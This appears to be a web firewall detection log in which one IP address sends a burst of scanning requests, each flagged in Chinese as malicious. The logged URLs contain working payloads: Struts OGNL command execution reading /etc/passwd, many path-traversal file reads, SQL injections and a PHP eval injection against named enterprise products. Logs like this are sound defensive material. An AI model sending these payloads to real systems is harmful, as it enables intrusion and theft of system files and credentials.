[2026-04-02 10:12:16] IP: 106.227.72.11 | URL: /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D | 发现恶意特征在 GET 参数: id
[2026-04-02 10:12:17] IP: 106.227.72.11 | URL: /index/ajax/lang?lang=../../application/database | 发现恶意特征在 GET 参数: lang
[2026-04-02 10:12:17] IP: 106.227.72.11 | URL: /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/abcd | 发现恶意特征在 GET 参数: puser
[2026-04-02 10:12:17] IP: 106.227.72.11 | URL: /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1%2F**%2Fand(select%2F**%2F1)%3E0%2F**%2Fwaitfor%2F**%2Fdelay&#039;0%3A0%3A10&#039;%2F**%2F | 发现恶意特征在 GET 参数: docId
[2026-04-02 10:12:18] IP: 106.227.72.11 | URL: /kp/PrintZPYG.jsp?zpjhid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13,14+--+ | 发现恶意特征在 GET 参数: zpjhid
[2026-04-02 10:12:18] IP: 106.227.72.11 | URL: /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A5 | 发现恶意特征在 GET 参数: id
[2026-04-02 10:12:18] IP: 106.227.72.11 | URL: /index.jsp | 发现恶意特征在 COOKIE 参数: JSESSIONID
[2026-04-02 10:12:18] IP: 106.227.72.11 | URL: /?s=%2Fa%2Fb%2Fc%2F%24%7B%40eval%28%24_GET%5B1%5D%29%7D | 发现恶意特征在 GET 参数: s
[2026-04-02 10:12:19] IP: 106.227.72.11 | URL: /?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-yakit%20 | 发现恶意特征在 GET 参数: contents
[2026-04-02 10:12:19] IP: 106.227.72.11 | URL: /manage/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../ | 发现恶意特征在 GET 参数: filename
[2026-04-02 10:12:25] IP: 106.227.72.11 | URL: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: apis
[2026-04-02 10:12:25] IP: 106.227.72.11 | URL: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini | 发现恶意特征在 GET 参数: fileName
[2026-04-02 10:12:25] IP: 106.227.72.11 | URL: /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: fileName
[2026-04-02 10:12:26] IP: 106.227.72.11 | URL: /systemController/showOrDownByurl.do?down=&amp;dbPath=../../../../../../etc/passwd | 发现恶意特征在 GET 参数: dbPath
[2026-04-02 10:12:26] IP: 106.227.72.11 | URL: /index.php?s=Admin-Data-down&amp;id=../../Conf/config.php | 发现恶意特征在 GET 参数: id
[2026-04-02 10:12:26] IP: 106.227.72.11 | URL: /systemController/showOrDownByurl.do?down=&amp;dbPath=../../../../../Windows/win.ini | 发现恶意特征在 GET 参数: dbPath
[2026-04-02 10:12:26] IP: 106.227.72.11 | URL: /user/City_ajax.aspx?CityId=3&#039;union%20select%20sys.fn_sqlvarbasetostr(HashBytes(&#039;MD5&#039;,&#039;888888888888888&#039;)),2-- | 发现恶意特征在 GET 参数: CityId
[2026-04-02 10:12:26] IP: 106.227.72.11 | URL: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession | 发现恶意特征在 GET 参数: lang
[2026-04-02 10:12:27] IP: 106.227.72.11 | URL: /go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../../../../../../windows/win.ini | 发现恶意特征在 GET 参数: pluginName
[2026-04-02 10:12:27] IP: 106.227.72.11 | URL: /go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../../../../../../etc/passwd | 发现恶意特征在 GET 参数: pluginName
[2026-04-02 10:12:27] IP: 106.227.72.11 | URL: /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en | 发现恶意特征在 GET 参数: locale
[2026-04-02 10:12:27] IP: 106.227.72.11 | URL: /cpt/manage/validate.jsp?sourcestring=validateNum | 发现恶意特征在 POST 参数: capitalid
[2026-04-02 10:12:27] IP: 106.227.72.11 | URL: /mobile/browser/WorkflowCenterTreeData.jsp | 发现恶意特征在 POST 参数: formids
[2026-04-02 10:12:40] IP: 106.227.72.11 | URL: /menu/stapp | 发现恶意特征在 POST 参数: appname
